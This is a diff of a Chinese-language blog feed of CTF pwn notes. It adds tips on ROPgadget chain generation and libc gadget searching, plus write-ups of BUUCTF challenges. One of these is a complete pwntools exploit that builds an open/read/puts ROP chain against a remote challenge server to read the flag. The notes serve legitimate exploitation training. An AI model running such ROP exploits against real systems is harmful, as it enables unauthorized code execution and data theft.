@@ -3281,6 +3281,16 @@
 
 <p>在上面的一串代码执行结束后来到下面这样一个判断，这里可以设置rbx和rbp的值为<code>rbx+1=rbp</code></p>
 <p>这样在这一块前面的call执行结束后就不会跳回去，可以继续执行后面的程序</p>
+<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>ROPgadget是一个比较常用的工具，这里也直接写一些不太常用到，但是很有用的功能；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary --ropchain</span><br></pre></td></tr></table></figure>
+
+<p>这样可以直接生成ropchain，返回的就是一个拿权限的shell</p>
+<p>一般用在静态链接的程序上，因为gadget比较多；</p>
+<h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><p>LibcSearcher一般用来ret2libc，判断libc的版本，这里也记一下相关的高级用法；</p>
+<p>在64位程序的ROP时，比较难搞的就是参数比较多的函数调用；</p>
+<p>因为64位程序的前几个参数是存在寄存器中的，如果不能将栈上的值pop到寄存器中就没办法正确的调用，但是一般情况下在二进制程序中比较难找到<code>pop rdx;ret</code>这样的gadget，这时可以用pwntools在libc里面找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">pop_rdx = libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)).next()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>pwn</category>
@@ -7720,16 +7730,46 @@
 <h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><p>非常朴素的ret2libc</p>
 <p>里面的vuln函数中read发生了溢出</p>
 <h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h2><p>程序中一共有两个read</p>
-<p><img src="buuctf-pwn1/image-20210104210109671.png" alt="image-20210104210109671"></p>
+<p><img src="image-20210104210109671.png" alt="image-20210104210109671"></p>
 <p>一个将内容读在了栈上，一个读在了bss段</p>
 <p>第一次溢出只能溢出两个字，所以是一个栈迁移的题目</p>
 <p>但是这个题比较烦人的地方在于bss段和got表特别接近</p>
-<p><img src="buuctf-pwn1/image-20210104215804626.png" alt="image-20210104215804626"></p>
+<p><img src="image-20210104215804626.png" alt="image-20210104215804626"></p>
 <p>如果直接用栈迁移的payload会导致在执行read的时候栈空间不够，导致got表被覆盖；</p>
 <p>所以在迁移的指令开始增加一些ret作为滑板指令；</p>
 <p>最后溢出的时候用system不行，要用execve</p>
 <p>网上的exp都是用了one_gadget，但是做这个的时候没有发现附加有libc的链接，如果没有libc的链接还是蛮难搞的啊</p>
 <p>另外还出现了本地打不通，远程能打通的情况</p>
+<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p>这个题目是一个32位静态链接的程序</p>
+<p>学到了使用ROPgadget直接生成rop链</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>
+
+<p>直接会返回一个python2的脚本，可以直接跑出shell</p>
+<p>只需要修改一下填充的偏移就可以</p>
+<h2 id="V-amp-N2020公开赛warmup"><a href="#V-amp-N2020公开赛warmup" class="headerlink" title="V&amp;N2020公开赛warmup"></a>V&amp;N2020公开赛warmup</h2><p>这个题是一个64位保护机制全开的题目</p>
+<p>里面有两次输入，都是在栈上</p>
+<p>第二次输入有溢出0x10，即两个字</p>
+<p>程序开始时执行了一个<code>prctl</code>函数</p>
+<p><img src="image-20210105213136408.png" alt="image-20210105213136408"></p>
+<p>这个函数本身是为进程线程设置属性的</p>
+<p><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>我也没看懂参数，但是看wp有人说是禁用了fork和execve的系统调用</p>
+<p>一共有两次输入</p>
+<p>第一次输入180，不产生溢出</p>
+<p><img src="image-20210105220529271.png" alt="image-20210105220529271"></p>
+<p>第二次输入80，溢出0x10</p>
+<p><img src="image-20210105220559363.png" alt="image-20210105220559363"></p>
+<p>这个题目虽然第二次溢出时只能溢出0x10</p>
+<p>但是这时gdb调试发现溢出的缓冲区正好能够和第一次输入连在一起</p>
+<p><img src="image-20210105220405189.png" alt="image-20210105220405189"></p>
+<p>也就是实际上能够控制后面整整0x180的内容</p>
+<p>程序本身还开启了PIE，got表是不可写的，我们可以写在<code>__free_hook</code>函数的位置</p>
+<p>或者其实也可以写在bss段、libc的bss段等等，只要有写权限就可以；</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27337</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./vn_pwn_warmup&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;gift: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = int(io.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;../lib/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + next(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rsi_ret = libc_base + next(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line">pop_rdx_ret = libc_base + next(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) +  p64(<span class="number">4</span>) + p64(read_addr)</span><br><span class="line"><span class="comment"># read(0,free_hook,4)</span></span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line"><span class="comment"># open(free_hook,7)</span></span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(free_hook) + p64(pop_rdx_ret) + p64(<span class="number">100</span>) + p64(read_addr)</span><br><span class="line"><span class="comment"># read(3,free_hook,100)</span></span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)</span><br><span class="line"><span class="comment"># puts(free_hook)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;something: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>调试了半天发现一直不对劲，最后发现是send和sendline的问题；</p>
 ]]></content>
       <categories>
         <category>buuctf</category>
